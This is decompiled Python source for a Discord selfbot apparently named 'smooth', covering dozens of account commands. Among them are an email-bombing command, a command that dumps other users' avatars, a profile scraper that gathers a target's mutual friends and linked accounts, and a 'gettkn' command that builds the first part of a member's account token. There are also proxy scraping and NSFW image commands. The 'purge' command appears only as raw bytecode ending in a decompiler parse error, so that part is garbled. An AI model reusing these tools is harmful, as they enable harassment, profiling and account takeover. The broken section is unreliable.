            em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
            await ctx.send(embed=em)


        @smooth.command(aliases=['ethereum'])
        async def eth(ctx):
            await ctx.message.delete()
            r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
            r = r.json()
            usd = r['USD']
            eur = r['EUR']
            em = discord.Embed(description=f"USD: `{str(usd)}$`\nEUR: `{str(eur)}€`")
            em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
            await ctx.send(embed=em)


        @smooth.command()
        async def topic(ctx):
            await ctx.message.delete()
            r = requests.get('https://www.conversationstarters.com/generator.php').content
            soup = bs4(r, 'html.parser')
            topic = soup.find(id='random').text
            await ctx.send(topic)


        @smooth.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
        async def wyr(ctx):
            await ctx.message.delete()
            r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
            soup = bs4(r, 'html.parser')
            qa = soup.find(id='qa').text
            qor = soup.find(id='qor').text
            qb = soup.find(id='qb').text
            em = discord.Embed(description=f"{qa}\n{qor}\n{qb}")
            await ctx.send(embed=em)


        @smooth.command()
        async def hastebin(ctx, *, message):
            await ctx.message.delete()
            r = requests.post('https://hastebin.com/documents', data=message).json()
            await ctx.send(f"<https://hastebin.com/{r['key']}>")


        @smooth.command()
        async def ascii(ctx, *, text):
            await ctx.message.delete()
            r = requests.get(f"http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}").text
            if len('```' + r + '```') > 2000:
                return
            await ctx.send(f"```{r}```")


        @smooth.command()
        async def anal(ctx):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/anal')
            res = r.json()
            em = discord.Embed()
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def erofeet(ctx):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/erofeet')
            res = r.json()
            em = discord.Embed()
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def feet(ctx):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/feetg')
            res = r.json()
            em = discord.Embed()
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def hentai(ctx):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/Random_hentai_gif')
            res = r.json()
            em = discord.Embed()
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def boobs(ctx):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/boobs')
            res = r.json()
            em = discord.Embed()
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def tits(ctx):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/tits')
            res = r.json()
            em = discord.Embed()
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def blowjob(ctx):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/blowjob')
            res = r.json()
            em = discord.Embed()
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def lewdneko(ctx):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/nsfw_neko_gif')
            res = r.json()
            em = discord.Embed()
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def lesbian(ctx):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/les')
            res = r.json()
            em = discord.Embed()
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def feed(ctx, user: discord.Member):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/feed')
            res = r.json()
            em = discord.Embed(description=(user.mention))
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def tickle(ctx, user: discord.Member):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/tickle')
            res = r.json()
            em = discord.Embed(description=(user.mention))
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def slap(ctx, user: discord.Member):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/slap')
            res = r.json()
            em = discord.Embed(description=(user.mention))
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def hug(ctx, user: discord.Member):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/hug')
            res = r.json()
            em = discord.Embed(description=(user.mention))
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def smug(ctx, user: discord.Member):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/smug')
            res = r.json()
            em = discord.Embed(description=(user.mention))
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def pat(ctx, user: discord.Member):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/pat')
            res = r.json()
            em = discord.Embed(description=(user.mention))
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command()
        async def kiss(ctx, user: discord.Member):
            await ctx.message.delete()
            r = requests.get('https://nekos.life/api/v2/img/kiss')
            res = r.json()
            em = discord.Embed(description=(user.mention))
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command(aliases=['proxy'])
        async def proxies(ctx):
            await ctx.message.delete()
            file = open('Data/Http-proxies.txt', 'a+')
            res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
            proxies = []
            for proxy in res.text.split('\n'):
                proxy = proxy.strip()
                if proxy:
                    proxies.append(proxy)

            for p in proxies:
                file.write(p + '\n')
            else:
                file = open('Data/Https-proxies.txt', 'a+')
                res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
                proxies = []
                for proxy in res.text.split('\n'):
                    proxy = proxy.strip()
                    if proxy:
                        proxies.append(proxy)

                for p in proxies:
                    file.write(p + '\n')
                else:
                    file = open('Data/Socks4-proxies.txt', 'a+')
                    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
                    proxies = []
                    for proxy in res.text.split('\n'):
                        proxy = proxy.strip()
                        if proxy:
                            proxies.append(proxy)

                    for p in proxies:
                        file.write(p + '\n')
                    else:
                        file = open('Data/Socks5-proxies.txt', 'a+')
                        res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
                        proxies = []
                        for proxy in res.text.split('\n'):
                            proxy = proxy.strip()
                            if proxy:
                                proxies.append(proxy)
                        else:
                            for p in proxies:
                                file.write(p + '\n')


        @smooth.command()
        async def uptime(ctx):
            await ctx.message.delete()
            uptime = datetime.datetime.utcnow() - start_time
            uptime = str(uptime).split('.')[0]
            await ctx.send('`' + uptime + '`')


        @smooth.command()
        async def purge--- This code section failed: ---

 L.1822         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1823        16  LOAD_FAST                'ctx'
               18  LOAD_ATTR                message
               20  LOAD_ATTR                channel
               22  LOAD_ATTR                history
               24  LOAD_FAST                'amount'
               26  LOAD_CONST               ('limit',)
               28  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               30  LOAD_METHOD              filter
               32  LOAD_LAMBDA              '<code_object <lambda>>'
               34  LOAD_STR                 'purge.<locals>.<lambda>'
               36  MAKE_FUNCTION_0          ''
               38  CALL_METHOD_1         1  ''
               40  LOAD_METHOD              map
               42  LOAD_LAMBDA              '<code_object <lambda>>'
               44  LOAD_STR                 'purge.<locals>.<lambda>'
               46  MAKE_FUNCTION_0          ''
               48  CALL_METHOD_1         1  ''
               50  GET_AITER        
             52_0  COME_FROM            96  '96'
             52_1  COME_FROM            92  '92'
             52_2  COME_FROM            82  '82'
               52  SETUP_FINALLY        98  'to 98'
               54  GET_ANEXT        
               56  LOAD_CONST               None
               58  YIELD_FROM       
               60  POP_BLOCK        
               62  STORE_FAST               'message'

 L.1824        64  SETUP_FINALLY        84  'to 84'

 L.1825        66  LOAD_FAST                'message'
               68  LOAD_METHOD              delete
               70  CALL_METHOD_0         0  ''
               72  GET_AWAITABLE    
               74  LOAD_CONST               None
               76  YIELD_FROM       
               78  POP_TOP          
               80  POP_BLOCK        
               82  JUMP_BACK            52  'to 52'
             84_0  COME_FROM_FINALLY    64  '64'

 L.1826        84  POP_TOP          
               86  POP_TOP          
               88  POP_TOP          

 L.1827        90  POP_EXCEPT       
               92  JUMP_BACK            52  'to 52'
               94  END_FINALLY      
               96  JUMP_BACK            52  'to 52'
             98_0  COME_FROM_FINALLY    52  '52'
               98  END_ASYNC_FOR    

Parse error at or near `JUMP_BACK' instruction at offset 92


        @smooth.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
        async def _group_leaver(ctx):
            await ctx.message.delete()
            for channel in smooth.private_channels:
                if isinstance(channel, discord.GroupChannel):
                    await channel.leave()


        @smooth.command()
        async def help(ctx):
            await ctx.message.delete()
            url = 'https://selfbotsmooth.000webhostapp.com/commands.html'
            r = requests.get(url)
            if r.status_code == 200:
                webbrowser.open(url)


        @smooth.command()
        async def stream(ctx, *, message):
            await ctx.message.delete()
            stream = discord.Streaming(name=message,
              url=stream_url)
            await smooth.change_presence(activity=stream)


        @smooth.command()
        async def game(ctx, *, message):
            await ctx.message.delete()
            game = discord.Game(name=message)
            await smooth.change_presence(activity=game)


        @smooth.command()
        async def listening(ctx, *, message):
            await ctx.message.delete()
            await smooth.change_presence(activity=discord.Activity(type=(discord.ActivityType.listening),
              name=message))


        @smooth.command()
        async def watching(ctx, *, message):
            await ctx.message.delete()
            await smooth.change_presence(activity=discord.Activity(type=(discord.ActivityType.watching),
              name=message))


        @smooth.command(aliases=['markasread', 'ack'])
        async def read(ctx):
            await ctx.message.delete()
            for guild in smooth.guilds:
                await guild.ack()


        @smooth.command()
        async def reverse(ctx, *, message):
            await ctx.message.delete()
            message = message[::-1]
            await ctx.send(message)


        @smooth.command()
        async def shrug(ctx):
            await ctx.message.delete()
            shrug = '¯\\_(ツ)_/¯'
            await ctx.send(shrug)


        @smooth.command()
        async def lenny(ctx):
            await ctx.message.delete()
            lenny = '( ͡° ͜ʖ ͡°)'
            await ctx.send(lenny)


        @smooth.command()
        async def tableflip(ctx):
            await ctx.message.delete()
            tableflip = '(╯°□°）╯︵ ┻━┻'
            await ctx.send(tableflip)


        @smooth.command()
        async def unflip(ctx):
            await ctx.message.delete()
            unflip = '┬─┬ ノ( ゜-゜ノ)'
            await ctx.send(unflip)


        @smooth.command()
        async def bold(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('**' + message + '**')


        @smooth.command()
        async def secret(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('||' + message + '||')


        @smooth.command(name='role-hexcode', aliases=['rolecolor'])
        async def _role_hexcode(ctx, *, role: discord.Role):
            await ctx.message.delete()
            await ctx.send(f"{role.name} : {role.color}")


        @smooth.command(name='get-hwid', aliases=['hwid', 'gethwid', 'hwidget'])
        async def _get_hwid(ctx):
            await ctx.message.delete()
            print(f"HWID: {Fore.YELLOW}{hwid}" + Fore.RESET)


        @smooth.command()
        async def empty(ctx):
            await ctx.message.delete()
            await ctx.send(chr(173))


        @smooth.command()
        async def everyone(ctx):
            await ctx.message.delete()
            await ctx.send('https://@everyone@google.com')


        @smooth.command()
        async def logout(ctx):
            await ctx.message.delete()
            await smooth.logout()


        @smooth.command(aliases=['btc-stream', 'streambtc', 'stream-btc', 'btcstatus'])
        async def btcstream(ctx):
            await ctx.message.delete()
            btc_status.start()


        @smooth.command(name='steal-all-pfp', aliases=['steal-all-pfps', 'stealallpfps'])
        async def _steal_all_pfp(ctx):
            await ctx.message.delete()
            Dump(ctx)


        @smooth.command(aliases=['clearconsole', 'consoleclear'])
        async def cls(ctx):
            await ctx.message.delete()
            Clear()


        @smooth.command()
        async def nitro(ctx):
            await ctx.message.delete()
            await ctx.send(Nitro())


        @smooth.command(name='gmail-bomb', aliases=['gmail-bomber', 'gmailbomb', 'email-bomber', 'emailbomber'])
        async def _gmail_bomb(ctx):
            await ctx.message.delete()
            GmailBomber()


        @smooth.command()
        async def embed(ctx, *, message):
            await ctx.message.delete()
            embed = discord.Embed(color=16290997, description=f">>> **{str(message)}**")
            await ctx.send(embed=embed)


        @smooth.command()
        async def ping(ctx):
            """ 🏓Pong! """
            await ctx.message.delete()
            before = time.monotonic()
            message = await ctx.send('🏓Pong!')
            ping = (time.monotonic() - before) * 1000
            await message.edit(content=f"🏓Pong!  `{int(ping)}ms`")


        @smooth.command()
        async def junknick(ctx):
            await ctx.message.delete()
            try:
                name = '𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫𒐫'
                await ctx.author.edit(nick=name)
            except Exception as e:
                try:
                    await ctx.send(f"Error: {e}")
                finally:
                    e = None
                    del e


        @smooth.command()
        async def nick(ctx, *, name: str=None):
            await ctx.message.delete()
            if name is None:
                await ctx.send(f"Usage: {ctx.prefix}rename <new name>")
            else:
                pass
            if len(name) < 1:
                await ctx.send('Name need to have atleast 1 characters')
            else:
                try:
                    await ctx.author.edit(nick=name)
                    await ctx.send(f"Change nickname into `{name}`")
                except Exception as e:
                    try:
                        await ctx.send(f"Error: {e}")
                    finally:
                        e = None
                        del e


        @smooth.command()
        async def owo(ctx):
            await ctx.message.delete()
            await ctx.send('0w0')


        @smooth.command()
        async def meme(ctx):
            await ctx.message.delete()
            r = requests.get('https://meme-api.herokuapp.com/gimme')
            res = r.json()
            em = discord.Embed()
            em.set_image(url=(res['url']))
            await ctx.send(embed=em)


        @smooth.command(pass_context=True)
        async def gettkn(ctx, member: discord.Member):
            await ctx.message.delete()
            reply = base64.b64encode(str(member.id).encode())
            await ctx.send('{} __Token begin__ : `{}`'.format(member.mention, reply.decode()))


        @smooth.command(pass_context=True)
        async def load(ctx):
            await ctx.message.edit(content='[~/.*                ] ')
            await ctx.message.edit(content='[    ~/.*            ] ')
            await ctx.message.edit(content='[        ~/.*        ] ')
            await ctx.message.edit(content='[            ~/.*    ] ')
            await ctx.message.edit(content='[                ~/.*] ')
            await ctx.message.edit(content='[            *.\\~    ] ')
            await ctx.message.edit(content='[        *.\\~        ] ')
            await ctx.message.edit(content='[    *.\\~            ] ')
            await ctx.message.edit(content='[*.\\~                ] ')
            await ctx.message.delete()


        @smooth.command(pass_context=True, aliases=['lnick'])
        async def loadnick(ctx):
            await ctx.message.delete()
            while True:
                name = ''
                for letter in smooth.user.name:
                    name = name + letter
                    await ctx.message.author.edit(nick=name)


        @smooth.command()
        async def info(ctx, description='Shows the information of a certain person on discord. You should ping the person in your message'):
            await ctx.message.delete()
            user = ctx.message.mentions[0]
            name, discrim, avatar, created_at = (user.name, user.discriminator, user.avatar_url, user.created_at)
            mutuals = await user.mutual_friends()
            mfriends = []
            for mutual in mutuals:
                profile = await mutual.profile()
                mfriends.append(f"{profile.user.name}#{profile.user.discriminator}")
            else:
                if len(mfriends) > 0:
                    mfr = ', '.join(mfriends)
                else:
                    mfr = mfriends
                profile = await user.profile()
                nitro, nitro_since, mutual_guilds, connected_accounts = (profile.nitro, profile.premium_since, profile.mutual_guilds, profile.connected_accounts)
                caccs = []
                steamid64 = ''
                for account in connected_accounts:
                    atype = account['type']
                    aid = account['id']
                    aname = account['name']
                    if atype == 'steam':
                        caccs.append(f"{atype} {aid} {aname}")
                        steamid64 = aid
                    else:
                        caccs.append(f"{atype} {aname}")
                else:
                    if len(caccs) > 0:
                        linkedaccounts = ', '.join(caccs)
                    else:
                        linkedaccounts = caccs
                    mguilds = []
                    for guild in mutual_guilds:
                        mguilds.append(guild.name)
                    else:
                        if len(mguilds) > 0:
                            mutualg = ', '.join(mguilds)
                        else:
                            mutualg = mguilds
                        if steamid64 != '':
                            e = discord.Embed(title=f"Discord Profile Information for {name}#{discrim}", url=f"https://steamcommunity.com/profiles/{steamid64}", timestamp=(ctx.message.created_at), colour=16290997)
                        else:
                            e = discord.Embed(title=f"Discord Profile Information for {name}#{discrim}", timestamp=(ctx.message.created_at), colour=16290997)
                        e.add_field(name='Creation date', value=created_at, inline=False)
                        e.add_field(name='Nitro since', value=nitro_since, inline=False)
                        e.add_field(name='Mutual guilds', value=mutualg, inline=False)
                        e.add_field(name='Nitro?', value=nitro, inline=False)
                        e.add_field(name='Mutual friends', value=mfr, inline=False)
                        e.add_field(name='Linked accounts:', value=linkedaccounts, inline=False)
                        e.set_image(url=avatar)
                        await ctx.send(embed=e)


        @smooth.command()
        async def edit(ctx, text):
            amount = 0
            await ctx.message.delete()
            channel_id = ctx.message.channel.id
            cid = await smooth.fetch_channel(int(channel_id))
            async for msg in cid.history(limit=None).filter(lambda m: m.author == smooth.user).map(lambda m: m):
                try:
                    await msg.edit(content=text)
                    amount += 1
                except Exception:
                    pass


        @smooth.command()
        async def list(ctx):
            await ctx.message.delete()
            members = ''
            c = 0
            for member in ctx.guild.members:
                members = members + '\n' + str(member)
                c = c + 1
            else:
                await ctx.send('There are ' + str(c) + ' members\n' + members)


        @smooth.command()
        async def advice(ctx):
            await ctx.message.delete()
            r = requests.get('https://api.adviceslip.com/advice')
            await ctx.send(r.json()['slip']['advice'])


        if __name__ == '__main__':
            Init()